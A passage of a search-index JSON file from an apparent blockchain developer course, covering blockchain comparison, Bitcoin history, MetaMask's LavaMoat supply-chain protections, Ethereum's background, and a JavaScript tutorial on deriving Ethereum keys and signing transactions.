Periods We mentioned Block Production and Block Propagation as two general periods in Proof of Work. In any network, what are the different periods the network goes through as it achieves distributed consensus? Cryptographic Primitives This is very technical and advanced, but knowing what cryptographic family and implementation the network uses for its hashing and encryption can shed some light on a network. Mainly, if a network is using zero-knowledge proofs (which we'll learn about later) or something dramatically different from another network, that's good to know. Level of Decentralization This is a fuzzier variable and may involve incorporating the above data points to determine the level of decentralization. Or, the network is private or a testnet and will openly state that it's more centralized since that's appropriate for its function. Reason for Being Another fuzzy variable but it can be very telling to ask why another blockchain network needs to exist. Not because any are perfect, but rather because the answer will hopefully provide some more context into how the network is different from networks you are more familiar with. That way, you can port over what you already know about your favorite blockchain network to better understand another. Other variables include: Governance Structure (How does the network community decide on updates, fixes, etc.) Developer community size and support General community size and support Network size (How many nodes are there?) Open or Closed Source (Can anyone view or contribute to the implementation code online?) Below is an image showing a rough comparison of a few popular blockchain networks. Looking over it, you may see the benefit of having a set series of variables to analyze multiple networks. There aren't too many things that can change and those that do should have something to tell you about the purpose of the network and any strengths or weaknesses it might have: The other aspect of comparing blockchains is the concept of crosschain compatibility or blockchain interoperability. This is the ability of public blockchains to share network data with each other. We're living in an increasingly multi-chain world, where there are many significant blockchain networks. Rather than trying to have one chain monopolize, blockchain interoperability seeks to leverage different strengths and minimize weaknesses of the existing chains. We'll discuss this in more detail in a later section. Additional Materials Article: Secp256k1 (River Financial) Description of the Elliptic Curve used by Ethereum and Bitcoin. Chart: Cryptography Behind Cryptocurrencies A table of which cryptography is used with major blockchain networks. Article: Blockchain Interoperability: Why is Cross Chain Technology Important? (101 Blockchains) A brief introduction to blockchain interoperability. Article: Understanding Cross Chain Communication (Ivan on Tech) Another overview of cross chain communication, including bridges.","title":"Index"},{"location":"S01-fundamentals/M3-ag-blockchain/L2-configurations/#configurations-for-different-blockchain-networks","text":"Now that we have a general model of a blockchain, when we encounter a new network, we know which questions to ask. Some suggested parts of the model you could build on: Nodes and Roles What are the different roles in the network for nodes? What are the ways the nodes join the network and acquire their different roles? Consensus Mechanism Always good to know for a blockchain network, will typically let you know whether a network is public, private or consortium. It typically also lets you know the processing limit for the network. The lower the trust assumptions, usually the more limited the processing limit (To be clear, not always the case). Periods We mentioned Block Production and Block Propagation as two general periods in Proof of Work. In any network, what are the different periods the network goes through as it achieves distributed consensus? Cryptographic Primitives This is very technical and advanced, but knowing what cryptographic family and implementation the network uses for its hashing and encryption can shed some light on a network. Mainly, if a network is using zero-knowledge proofs (which we'll learn about later) or something dramatically different from another network, that's good to know. Level of Decentralization This is a fuzzier variable and may involve incorporating the above data points to determine the level of decentralization. Or, the network is private or a testnet and will openly state that it's more centralized since that's appropriate for its function. Reason for Being Another fuzzy variable but it can be very telling to ask why another blockchain network needs to exist. Not because any are perfect, but rather because the answer will hopefully provide some more context into how the network is different from networks you are more familiar with. That way, you can port over what you already know about your favorite blockchain network to better understand another. Other variables include: Governance Structure (How does the network community decide on updates, fixes, etc.) Developer community size and support General community size and support Network size (How many nodes are there?) Open or Closed Source (Can anyone view or contribute to the implementation code online?) Below is an image showing a rough comparison of a few popular blockchain networks. Looking over it, you may see the benefit of having a set series of variables to analyze multiple networks. There aren't too many things that can change and those that do should have something to tell you about the purpose of the network and any strengths or weaknesses it might have: The other aspect of comparing blockchains is the concept of crosschain compatibility or blockchain interoperability. This is the ability of public blockchains to share network data with each other. We're living in an increasingly multi-chain world, where there are many significant blockchain networks. Rather than trying to have one chain monopolize, blockchain interoperability seeks to leverage different strengths and minimize weaknesses of the existing chains. We'll discuss this in more detail in a later section.","title":"Configurations for Different Blockchain Networks"},{"location":"S01-fundamentals/M3-ag-blockchain/L2-configurations/#additional-materials","text":"Article: Secp256k1 (River Financial) Description of the Elliptic Curve used by Ethereum and Bitcoin. Chart: Cryptography Behind Cryptocurrencies A table of which cryptography is used with major blockchain networks. Article: Blockchain Interoperability: Why is Cross Chain Technology Important? (101 Blockchains) A brief introduction to blockchain interoperability. Article: Understanding Cross Chain Communication (Ivan on Tech) Another overview of cross chain communication, including bridges.","title":"Additional Materials"},{"location":"S01-fundamentals/M3-ag-blockchain/L3-public-private-networks/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M3-ag-blockchain/L3-public-private-networks/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M3-ag-blockchain/L4-when-to-use/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M3-ag-blockchain/L4-when-to-use/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/","text":"================================ Please note: People have written books about Bitcoin's history and development and this is just a section of our course. We'll be the first to admit that an overview of Bitcoin requires discretion on our part. Opinionated or controversial comments are flagged as best we can but, as always, we're hoping mainly to give a overview of the major points. Inevitably, we'll miss something. \"Bitcoin is Old Technology\" As we've mentioned frequently, Bitcoin relies on decades of technological development. This has led to a meme \"Bitcoin is Old Technology\": Satoshi Nakamoto was aware of all these developments, and references them throughout their whitepaper. But Bitcoin actually started on a listserve and with Nakamoto sharing a piece of software they were building. It was initially simply called \"Bitcoin\" and was built using C++. Nakamoto also encouraged others to run the software and began gathering the early developers who ran the first distributed network. Once the software was stable, Nakamoto released a whitepaper describing the concepts underpinning the software and referencing some of the older technologies it drew upon. By the release of the whitepaper, there was a growing community of developers interested in Bitcoin and discussing its future. Famously, Nakamoto stepped back from the project in early 2011. In April of that year, Nakamoto posted their last update to Bitcoin Core, as the software was now known and gave developer credentials to the now-lead technical developer, Gavin Andresen. ( source ) Many have speculated about Satoshi Nakamoto's identity but their identity has never been definitively proven. There is a significant amount of bitcoin (some estimates say around one million bitcoin) Nakamoto mined during their time running the Bitcoin Core software. It's considered to be the best identity test for anyone claiming to be Nakamoto: Sign a cryptographic digital message with the private key associated with this bitcoin. It has never been done! Basic Technical Features We'll briefly touch on two main technical parts of the Bitcoin network: The UTXO transaction model and the Script smart-contract language. The Unspent Transaction Output or UTXO model is the fundamental building block of transactions in the Bitcoin network. Per Wikipedia: \"Each UTXO is analogous to a coin, and holds a certain amount of value in its respective currency. Each UTXO represents a chain of ownership implemented as a chain of digital signatures where the owner signs a message (transaction) transferring ownership of their UTXO to the receiver's public key.\" The UTXO model is in contrast to the account model that Ethereum tracks value in the network Many don't realize this, but Bitcoin does actually technically have a programming language it uses, called Script, which is based off the Forth programming language. It's very limited in its capacity, but you can read about some of its capacity in Mastering Bitcoin in the \"Advanced Transactions and Scripting\" chapter. Conclusion It's sometimes easy for others to find fault with Bitcoin and the Bitcoin community. However, it's important to note Bitcoin's contribution to the world, both specifically to blockchains but also to distributed networks generally. We can't go as deep as we'd like to (we can't, but we'd like to talk about the Segregated Witness development and the more recent Taproot fork), but we'd encourage you to at least checkout the whitepaper. At this point, you should be able to understand all the concepts in it! Here are some great resources for reading the whitepaper, which can be intimidating on its own: Fermat's Library: Bitcoin Whitepaper Annotated Genius.com's Annotation of Bitcoin White Paper Additional Material History and Nakamoto Wikipedia: Bitcoin A general overview of Bitcoin from our favorite hive mind encyclopedia. Article: Exploring Bitcoin's History A very long, but thorough, article discussing all the technology building up to Bitcoin, including TCP/IP, Elliptic Curve Cryptography, time-stamp servers, smart contracts and more. Article: The Crypto-Currency An article discussing Bitcoin and it's mysterious creator Satoshi Nakamoto, from October 2011 Article: What Bitcoin Is and Why It Matters (MIT) Article: What Happened When Bitcoin Creator Satoshi Nakamoto Disappeared (Bitcoin Magazine) An article charting the rise of Nakamoto, the community of developers who grew around the project, and the eventual disappearance of Nakamoto from the project in 2011. Technical Features and Development Book: Mastering Bitcoin Considered to be the best-in-class introduction to Bitcoin development. Tutorial: Advanced Transactions Section from \"Mastering Bitcoin\" about Script's more advanced features. General Resources Online Course: What is Money? (UC Berkeley) Article: You Don't Understand Bitcoin Because You Think Money is Real A favorite article of ours! Article: What is Money? (London Review of Books) Sort-of paywalled, but a think piece about the implications of Bitcoin from April 2016. Article: What the Heck is UTXO?","title":"Index"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#bitcoin-is-old-technology","text":"As we've mentioned frequently, Bitcoin relies on decades of technological development. This has led to a meme \"Bitcoin is Old Technology\": Satoshi Nakamoto was aware of all these developments, and references them throughout their whitepaper. But Bitcoin actually started on a listserve and with Nakamoto sharing a piece of software they were building. It was initially simply called \"Bitcoin\" and was built using C++. Nakamoto also encouraged others to run the software and began gathering the early developers who ran the first distributed network. Once the software was stable, Nakamoto released a whitepaper describing the concepts underpinning the software and referencing some of the older technologies it drew upon. By the release of the whitepaper, there was a growing community of developers interested in Bitcoin and discussing its future. Famously, Nakamoto stepped back from the project in early 2011. In April of that year, Nakamoto posted their last update to Bitcoin Core, as the software was now known and gave developer credentials to the now-lead technical developer, Gavin Andresen. ( source ) Many have speculated about Satoshi Nakamoto's identity but their identity has never been definitively proven. There is a significant amount of bitcoin (some estimates say around one million bitcoin) Nakamoto mined during their time running the Bitcoin Core software. It's considered to be the best identity test for anyone claiming to be Nakamoto: Sign a cryptographic digital message with the private key associated with this bitcoin. It has never been done!","title":"\"Bitcoin is Old Technology\""},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#basic-technical-features","text":"We'll briefly touch on two main technical parts of the Bitcoin network: The UTXO transaction model and the Script smart-contract language. The Unspent Transaction Output or UTXO model is the fundamental building block of transactions in the Bitcoin network. Per Wikipedia: \"Each UTXO is analogous to a coin, and holds a certain amount of value in its respective currency. Each UTXO represents a chain of ownership implemented as a chain of digital signatures where the owner signs a message (transaction) transferring ownership of their UTXO to the receiver's public key.\" The UTXO model is in contrast to the account model that Ethereum tracks value in the network Many don't realize this, but Bitcoin does actually technically have a programming language it uses, called Script, which is based off the Forth programming language. It's very limited in its capacity, but you can read about some of its capacity in Mastering Bitcoin in the \"Advanced Transactions and Scripting\" chapter.","title":"Basic Technical Features"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#conclusion","text":"It's sometimes easy for others to find fault with Bitcoin and the Bitcoin community. However, it's important to note Bitcoin's contribution to the world, both specifically to blockchains but also to distributed networks generally. We can't go as deep as we'd like to (we can't, but we'd like to talk about the Segregated Witness development and the more recent Taproot fork), but we'd encourage you to at least checkout the whitepaper. At this point, you should be able to understand all the concepts in it! Here are some great resources for reading the whitepaper, which can be intimidating on its own: Fermat's Library: Bitcoin Whitepaper Annotated Genius.com's Annotation of Bitcoin White Paper","title":"Conclusion"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#additional-material","text":"","title":"Additional Material"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#history-and-nakamoto","text":"Wikipedia: Bitcoin A general overview of Bitcoin from our favorite hive mind encyclopedia. Article: Exploring Bitcoin's History A very long, but thorough, article discussing all the technology building up to Bitcoin, including TCP/IP, Elliptic Curve Cryptography, time-stamp servers, smart contracts and more. Article: The Crypto-Currency An article discussing Bitcoin and it's mysterious creator Satoshi Nakamoto, from October 2011 Article: What Bitcoin Is and Why It Matters (MIT) Article: What Happened When Bitcoin Creator Satoshi Nakamoto Disappeared (Bitcoin Magazine) An article charting the rise of Nakamoto, the community of developers who grew around the project, and the eventual disappearance of Nakamoto from the project in 2011.","title":"History and Nakamoto"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#technical-features-and-development","text":"Book: Mastering Bitcoin Considered to be the best-in-class introduction to Bitcoin development. Tutorial: Advanced Transactions Section from \"Mastering Bitcoin\" about Script's more advanced features.","title":"Technical Features and Development"},{"location":"S01-fundamentals/M4-bitcoin/L1-history-and-development/#general-resources","text":"Online Course: What is Money? (UC Berkeley) Article: You Don't Understand Bitcoin Because You Think Money is Real A favorite article of ours! Article: What is Money? (London Review of Books) Sort-of paywalled, but a think piece about the implications of Bitcoin from April 2016. Article: What the Heck is UTXO?","title":"General Resources"},{"location":"S01-fundamentals/M5-wallets/L1-what-is-a-wallet/","text":"Title","title":"Index"},{"location":"S01-fundamentals/M5-wallets/L1-what-is-a-wallet/#title","text":"","title":"Title"},{"location":"S01-fundamentals/M5-wallets/L2-intro-to-mm/","text":"Introduction to MetaMask This is currently a video on LMS Browsers 300: MetaMask Learning Session with Tom Hay and Anthony Albertorio","title":"Index"},{"location":"S01-fundamentals/M5-wallets/L2-intro-to-mm/#introduction-to-metamask","text":"This is currently a video on LMS Browsers 300: MetaMask Learning Session with Tom Hay and Anthony Albertorio","title":"Introduction to MetaMask"},{"location":"S01-fundamentals/M5-wallets/L3-mm-lavamoat/","text":"How Does MetaMask Keep Your Keys Safe? There are more Ethereum wallets available now than, say, a few years ago. What makes MetaMask special? In the next two sections, we're going to prove to you why MetaMask holds a characteristic that raises it above the rest. Namely, MetaMask has taken more steps than any digital cryptocurrency wallet to protect its users. As we hope you realize by now, this is of the utmost importance in the Web 3 paradigm. If we are decentralizing systems, that also means users take on much more security concerns than they are used to having on the web. It's a tall order for users, but even more massive for those building tooling used as extensively as MetaMask. Luckily, the MetaMask team is working with engineers in the broader JavaScript community who have been focussing on these issues for quite some time. All decentralized systems require a way to safely persist state and capture intent, not just blockchains, and the MetaMask team has been able to draw from decades of experience and contribute their own innovations. All of this helps push us towards a broader decentralized future. At the end of the day, MetaMask, is a user consent tool with a broad impact beyond public blockchains. With the user's private keys in the browser, you may assume the private key at some point is passed outside of MetaMask. However, this is never the case. To do so would invite imminent hack. But how to make sure the keys never leave MetaMask? You have to build something very difficult to penetrate around MetaMask. Enter... LavaMoat! From the repo: LavaMoat is a set of tools for securing JavaScript projects against a category of attacks called software supply chain attacks. This genre of attack occurs when a malicious dependency makes its way into a developer's application. An attacker could use the vulnerable dependency to then steal important secrets like credit card numbers, private keys, or personal data. These attacks have occurred in the software system, in part due to a larger phenomenon exemplified by the wide use of npm install when working on projects. Tons of warnings and errors fly by and, while the first few times it may be alarming, it's easy to become used to these warnings and ignore them. However, each of these dependencies can be a potential backdoor! A common sight Major ransomware attacks like the SolarWinds attack on US Federal Government Systems show us that the supply chain issue is not just restricted to JavaScript or cryptocurrency projects. Supply chain attacks present a significant risk for the developers and users of wallets and apps. In order to help mitigate the risk of such an attack MetaMask is building a suite of tools that range from a node-based runtime, to plugins for common app bundlers (eg webpack, browserify), to dependency analysis and visualization tools. The goal of LavaMoat is to bring added protections to modern JavaScript apps without having to rewrite them from scratch and automate a good first-start security configuration. Learn more about LavaMoat below and, in the next section, we'll hear from MetaMask co-founder Dan Finlay talk about MetaMasks' broader contributions in building a secure, extensible JavaScript to power a decentralized future. Additional Material Video: Introduction to LavaMoat (DevCon V) Video: LavaMoat: Securing Your Dependency Graph Code: LavaMoat GitHub Repo","title":"Index"},{"location":"S01-fundamentals/M5-wallets/L3-mm-lavamoat/#how-does-metamask-keep-your-keys-safe","text":"There are more Ethereum wallets available now than, say, a few years ago. What makes MetaMask special? In the next two sections, we're going to prove to you why MetaMask holds a characteristic that raises it above the rest. Namely, MetaMask has taken more steps than any digital cryptocurrency wallet to protect its users. As we hope you realize by now, this is of the utmost importance in the Web 3 paradigm. If we are decentralizing systems, that also means users take on much more security concerns than they are used to having on the web. It's a tall order for users, but even more massive for those building tooling used as extensively as MetaMask. Luckily, the MetaMask team is working with engineers in the broader JavaScript community who have been focussing on these issues for quite some time. All decentralized systems require a way to safely persist state and capture intent, not just blockchains, and the MetaMask team has been able to draw from decades of experience and contribute their own innovations. All of this helps push us towards a broader decentralized future. At the end of the day, MetaMask, is a user consent tool with a broad impact beyond public blockchains. With the user's private keys in the browser, you may assume the private key at some point is passed outside of MetaMask. However, this is never the case. To do so would invite imminent hack. But how to make sure the keys never leave MetaMask? You have to build something very difficult to penetrate around MetaMask. Enter... LavaMoat! From the repo: LavaMoat is a set of tools for securing JavaScript projects against a category of attacks called software supply chain attacks. This genre of attack occurs when a malicious dependency makes its way into a developer's application. An attacker could use the vulnerable dependency to then steal important secrets like credit card numbers, private keys, or personal data. These attacks have occurred in the software system, in part due to a larger phenomenon exemplified by the wide use of npm install when working on projects. Tons of warnings and errors fly by and, while the first few times it may be alarming, it's easy to become used to these warnings and ignore them. However, each of these dependencies can be a potential backdoor! A common sight Major ransomware attacks like the SolarWinds attack on US Federal Government Systems show us that the supply chain issue is not just restricted to JavaScript or cryptocurrency projects. Supply chain attacks present a significant risk for the developers and users of wallets and apps. In order to help mitigate the risk of such an attack MetaMask is building a suite of tools that range from a node-based runtime, to plugins for common app bundlers (eg webpack, browserify), to dependency analysis and visualization tools. The goal of LavaMoat is to bring added protections to modern JavaScript apps without having to rewrite them from scratch and automate a good first-start security configuration. Learn more about LavaMoat below and, in the next section, we'll hear from MetaMask co-founder Dan Finlay talk about MetaMasks' broader contributions in building a secure, extensible JavaScript to power a decentralized future.","title":"How Does MetaMask Keep Your Keys Safe?"},{"location":"S01-fundamentals/M5-wallets/L3-mm-lavamoat/#additional-material","text":"Video: Introduction to LavaMoat (DevCon V) Video: LavaMoat: Securing Your Dependency Graph Code: LavaMoat GitHub Repo","title":"Additional Material"},{"location":"S01-fundamentals/M5-wallets/L3-security-considerations/","text":"Title","title":"Index"},{"location":"S01-fundamentals/M5-wallets/L3-security-considerations/#title","text":"","title":"Title"},{"location":"S01-fundamentals/M5-wallets/L4-secure-extensible-javascript/","text":"Secure, Extensible JavaScript This is currently a video living on LMS (for now)","title":"Index"},{"location":"S01-fundamentals/M5-wallets/L4-secure-extensible-javascript/#secure-extensible-javascript","text":"This is currently a video living on LMS (for now)","title":"Secure, Extensible JavaScript"},{"location":"S01-fundamentals/M5-wallets/L5-mm-workshop/","text":"Secure, Extensible JavaScript","title":"Index"},{"location":"S01-fundamentals/M5-wallets/L5-mm-workshop/#secure-extensible-javascript","text":"","title":"Secure, Extensible JavaScript"},{"location":"S02-ethereum/M1-background/","text":"Ethereum History and Background In our last section, when discussing how to analyze new blockchain networks you encounter, we recommended you ask, \"Why does this network exist?\" Well, we think it's important to drink our own potions, so we'd like to ask that question of Ethereum: Why does it exist? We'll do a brief overview of the Ethereum network, including its history, but we'll dive deeper into all of this material over the rest of the course. Background Vitalik Buterin , a co-founder of Ethereum, was an active part of the Bitcoin community, including writing for Bitcoin Magazine. He and others in the community had become interested in developing more computing capacity for the Bitcoin network. As we learned in a previous section, Bitcoin does have a programming language, Script. Projects such as Colored Coins and RSK have tried to introduce extra programming capacity on top of the Bitcoin Network. Buterin and others researched this and decided to build their own network, which would become Ethereum. Launch of Ethereum Ethereum ran a pre-sale to fund its development and collected funds in Bitcoin. The testnet launched in May 2015 and the public mainnet, Frontier, launched in July 2015 ( source ). Ethereum differs from and overlaps with Bitcoin in quite a few ways. We'll get into more specifics later, but here are the broad strokes: Consensus Mechanism Ethereum and Bitcoin both use the Proof of Work mechanism to create blocks in their network. Ethereum is moving its network to Proof of Stake, a testnet of which was launched in December 2020. The effort to swap the consensus mechanism of Ethereum to Proof of Stake is sometimes called Ethereum 2.0. More on this later! Programming Language also called an Execution Environment. It's essentially how much a programmer can do with the network. As we mentioned, Bitcoin has a limited, programming language that can do some interesting things. However, one of Ethereum's biggest selling point for many developers is what's called the Ethereum Virtual Machine (EVM). Compared to Bitcoin's Script, the EVM provides a much more robust programming environment which allows people to build small, automated programs called smart contracts . For this reason, Ethereum can be the base layer for a number of other platforms and protocols. Developer Base Due to the capacity of the Ethereum network compared to Bitcoin, Ethereum has a much more robust developer base compared to Bitcoin. In the past few years, there have been blockchains also with more capacity than Bitcoin (We will examine a few of these in our section later on crosschain interoperability). However, Ethereum has the first-mover advantage as well as a well-organized developer base for both its protocol and for its smart contracts. Development of the Network: EIPs, ERCs The Ethereum community has a series of governing bodies that coordinate the maintenance and updating of the protocol. Ethereum Core Developers hold monthly calls, which are open to viewing by the public. There is also a group called Ethereum Cat Herders, which is dedicated to \"decentralized project management to support the Ethereum network.\" Changes to the Ethereum network begin as Ethereum Improvement Proposals (EIPs) . The EIP process is a well-defined system where anyone can submit ideas to improve the network. It will require a lot of effort and dedication, but EIPs are essential to the network's well-being. Related are Ethereum Request for Comments (or ERCs). ERCs are standards that have been agreed upon by the community. A well-known example are community standards for common smart contracts, like the ERC-20 and ERC-721 (also known as an NFT!). More on this later! Conclusion Overall, we would argue that Ethereum's extended capacity from the EVM gave rise to a broader community of developers. This has given Ethereum a distinct advantage over other blockchain networks. Now, this does not mean Ethereum is the best blockchain for all things. This also doesn't mean Ethereum will always be the blockchain with the strongest developer base. It's simply the case now. Let's learn more about the Ethereum ecosystem! Additional Material Article: A Short History of Ethereum (ConsenSys) Article: What is Ethereum 2.0? (ConsenSys) Reddit: What's the Difference Between ERC and EIP? Wiki: Ethereum Improvement Proposals Learn here about the Ethereum Improvement Proposal (EIP), the way in which standards to the protocols are created, developed, changed and (potentially) implemented. Wiki: Ethereum Community Great resource where you can learn how to get involved in the Ethereum community. Article: What is an Ethereum Core Developer? (Hudson Jameson) Great article detailing the previously-undefined term of a \"Core Developer.\" Jameson comes up with this definition, \"Ethereum core developers are people who currently provide significant contributions to Ethereum low-level protocol development\"","title":"Index"},{"location":"S02-ethereum/M1-background/#ethereum-history-and-background","text":"In our last section, when discussing how to analyze new blockchain networks you encounter, we recommended you ask, \"Why does this network exist?\" Well, we think it's important to drink our own potions, so we'd like to ask that question of Ethereum: Why does it exist? We'll do a brief overview of the Ethereum network, including its history, but we'll dive deeper into all of this material over the rest of the course.","title":"Ethereum History and Background"},{"location":"S02-ethereum/M1-background/#background","text":"Vitalik Buterin , a co-founder of Ethereum, was an active part of the Bitcoin community, including writing for Bitcoin Magazine. He and others in the community had become interested in developing more computing capacity for the Bitcoin network. As we learned in a previous section, Bitcoin does have a programming language, Script. Projects such as Colored Coins and RSK have tried to introduce extra programming capacity on top of the Bitcoin Network. Buterin and others researched this and decided to build their own network, which would become Ethereum.","title":"Background"},{"location":"S02-ethereum/M1-background/#launch-of-ethereum","text":"Ethereum ran a pre-sale to fund its development and collected funds in Bitcoin. The testnet launched in May 2015 and the public mainnet, Frontier, launched in July 2015 ( source ). Ethereum differs from and overlaps with Bitcoin in quite a few ways. We'll get into more specifics later, but here are the broad strokes: Consensus Mechanism Ethereum and Bitcoin both use the Proof of Work mechanism to create blocks in their network. Ethereum is moving its network to Proof of Stake, a testnet of which was launched in December 2020. The effort to swap the consensus mechanism of Ethereum to Proof of Stake is sometimes called Ethereum 2.0. More on this later! Programming Language also called an Execution Environment. It's essentially how much a programmer can do with the network. As we mentioned, Bitcoin has a limited, programming language that can do some interesting things. However, one of Ethereum's biggest selling point for many developers is what's called the Ethereum Virtual Machine (EVM). Compared to Bitcoin's Script, the EVM provides a much more robust programming environment which allows people to build small, automated programs called smart contracts . For this reason, Ethereum can be the base layer for a number of other platforms and protocols. Developer Base Due to the capacity of the Ethereum network compared to Bitcoin, Ethereum has a much more robust developer base compared to Bitcoin. In the past few years, there have been blockchains also with more capacity than Bitcoin (We will examine a few of these in our section later on crosschain interoperability). However, Ethereum has the first-mover advantage as well as a well-organized developer base for both its protocol and for its smart contracts.","title":"Launch of Ethereum"},{"location":"S02-ethereum/M1-background/#development-of-the-network-eips-ercs","text":"The Ethereum community has a series of governing bodies that coordinate the maintenance and updating of the protocol. Ethereum Core Developers hold monthly calls, which are open to viewing by the public. There is also a group called Ethereum Cat Herders, which is dedicated to \"decentralized project management to support the Ethereum network.\" Changes to the Ethereum network begin as Ethereum Improvement Proposals (EIPs) . The EIP process is a well-defined system where anyone can submit ideas to improve the network. It will require a lot of effort and dedication, but EIPs are essential to the network's well-being. Related are Ethereum Request for Comments (or ERCs). ERCs are standards that have been agreed upon by the community. A well-known example are community standards for common smart contracts, like the ERC-20 and ERC-721 (also known as an NFT!). More on this later!","title":"Development of the Network: EIPs, ERCs"},{"location":"S02-ethereum/M1-background/#conclusion","text":"Overall, we would argue that Ethereum's extended capacity from the EVM gave rise to a broader community of developers. This has given Ethereum a distinct advantage over other blockchain networks. Now, this does not mean Ethereum is the best blockchain for all things. This also doesn't mean Ethereum will always be the blockchain with the strongest developer base. It's simply the case now. Let's learn more about the Ethereum ecosystem!","title":"Conclusion"},{"location":"S02-ethereum/M1-background/#additional-material","text":"Article: A Short History of Ethereum (ConsenSys) Article: What is Ethereum 2.0? (ConsenSys) Reddit: What's the Difference Between ERC and EIP? Wiki: Ethereum Improvement Proposals Learn here about the Ethereum Improvement Proposal (EIP), the way in which standards to the protocols are created, developed, changed and (potentially) implemented. Wiki: Ethereum Community Great resource where you can learn how to get involved in the Ethereum community. Article: What is an Ethereum Core Developer? (Hudson Jameson) Great article detailing the previously-undefined term of a \"Core Developer.\" Jameson comes up with this definition, \"Ethereum core developers are people who currently provide significant contributions to Ethereum low-level protocol development\"","title":"Additional Material"},{"location":"S02-ethereum/M2-accounts/L1-accounts/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S02-ethereum/M2-accounts/L1-accounts/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/","text":"Generating Ethereum accounts in JavaScript Public key cryptography and digital signatures are a foundational technology that enable blockchains to work. In this project you are going to get your hands dirty and understand how they work at the code level. You will be using JavaScript and a simple web interface to see what is going on. Generate Private Key First, we are going to generate a private key, derive public keys from the private key and determine the associated accounts. To get started clone the project and run: $ npm install $ npm run watch # this will watch for updates in main.js and update bundle.js` $ npm run reload # this will serve the app @ localhost:8081 and refresh the page when there are updates (If you run into any problems while implementing this demo application, try opening the developer tools in the browser (Ctrl + Shift + I or F12) and checking the \"Console\" tab.) In the main.js file include the bip39 package . We will use this to generate random input to generate a private key. const BIP39 = require(\"bip39\") and directly below that include: // Generate a random mnemonic ( uses crypto . randomBytes under the hood ) , defaults to 128 - bits of entropy function generateMnemonic () { return BIP39 . generateMnemonic () } Note: Not all strings of characters are valid mneomics for generating keys. You can check if a mnemonic is valid by running: var isValid = BIP39 . validateMnemonic ( \"Enter your mnemonic here\" ) // This will return false because \"Enter your mneomnic here\" is not a valid phrase With this mnemonic, you can generate a seed from which to generate a private key. Add the following line to main.js : function generateSeed ( mnemonic ) { return BIP39 . mnemonicToSeed ( mnemonic ) } Generate a Public / Private Keypair Using this mnemonic as a source of randomness, you can now create signing keypair. To generate a private key from the hex seed, we will to use the ethereumjs-wallet library const hdkey = require ( \"ethereumjs-wallet/hdkey\" ) Explore a much more robust address derivation application at iancoleman.io function generatePrivKey ( mnemonic ){ const seed = generateSeed ( mnemonic ) return hdkey . fromMasterSeed ( seed ) . derivePath ( ` m / 44 '/60' / 0 '/0/0`).getWallet().getPrivateKey() } With the private key, we can generate the public key. Import the ethereumjs wallet and derive the public key const Wallet = require ( 'ethereumjs-wallet' ) ... function derivePubKey ( privKey ){ const wallet = Wallet . fromPrivateKey ( privKey ) return wallet . getPublicKey () } Generating the private key and public key is the same for both Bitcoin and Ethereum as both use secp256k1 elliptic curve cryptography . Deriving an account address from the public key differs slightly. Derive the Ethereum Address From the Keypair Deriving an Ethereum address from a public key requires an additional hashing algorithm. Import it like so: const keccak256 = require ( 'js-sha3' ) . keccak256 ; Taking the keccak-256 hash of the public key will return 32 bytes which you need to trim down to the last 20 bytes (40 characters in hex) to get the address function deriveEthAddress ( pubKey ){ const address = keccak256 ( pubKey ) // keccak256 hash of publicKey // Get the last 20 bytes of the public key return \"0x\" + address . substring ( address . length - 40 , address . length ) } You can check this mnemonic, private key and address against myetherwallet . Select restore from mnemonic or private key and verify that the derived address matches the one in this app. Creating a Digital Signature With Your Key Using this private key we can sign transactions from this address and broadcast them to the network. Nodes that are verifying transactions in the network will use the signature to determine the address of the signatory, cryptographically verifying that every transaction from this account is coming from someone who has access to the corresponding private key. You can sign transactions in the browser with the ethereumjs-tx library . const EthereumTx = require ( 'ethereumjs-tx' ) ... function signTx ( privKey , txData ){ const tx = new EthereumTx ( txData ) tx . sign ( privKey ) return tx } Unsigned Ethereum transactions look something like this: { nonce: '0x00', gasPrice: '0x09184e72a000', gasLimit: '0x2710', to: '0x31c1c0fec59ceb9cbe6ec474c31c1dc5b66555b6', value: '0x10', data: '0x7f7465737432000000000000000000000000000000000000000000000000000000600057', chainId: 3 } And a signed transaction looks something like this: { nonce: '0x00', gasPrice: '0x09184e72a000', gasLimit: '0x2710', to: '0x31c1c0fec59ceb9cbe6ec474c31c1dc5b66555b6', value: '0x00', data: '0x7f7465737432000000000000000000000000000000000000000000000000000000600057', v: '0x29', r: '0xb934fbdb16fda944ddc0cb33e64344b90fbd25564444832f7f8d697512069402', s: '0x29' } Notice the main difference is the inclusion of the variables v , r and s . These variables are used to recover the address corresponding to the key that signed the transaction. This signed transaction is broadcast to the network to be included in a block. You can read more about these variables in this excellent article here. You can recover the sender address from the signed transaction with the following method: function getSignerAddress ( signedTx ) { return \"0x\" + signedTx . getSenderAddress () . toString ( 'hex' ) } That's it! You've successfully generated a private, public keypair and then used that to derive a valid Ethereum address. You've also then created the world's tiniest crypto-wallet using signTx() function and seen how you can recover the address from a digital signature or signed transaction. You'll very rarely have to do this kind of crypto-primitive handling. For one, it's garbage for security. But, also, there is so much tooling available to you to do these kind of operations safely and efficiently at scale. For learning purposes, however, nothing beats coding this stuff on its own! Additional links: Understanding the concept of private keys, public keys and addresses in Ethereum Bitcoin wiki on Secp256k1 Ethereum yellow paper Article: The Magic of Digital Signatures (MyCrypto)","title":"Index"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/#generating-ethereum-accounts-in-javascript","text":"Public key cryptography and digital signatures are a foundational technology that enable blockchains to work. In this project you are going to get your hands dirty and understand how they work at the code level. You will be using JavaScript and a simple web interface to see what is going on.","title":"Generating Ethereum accounts in 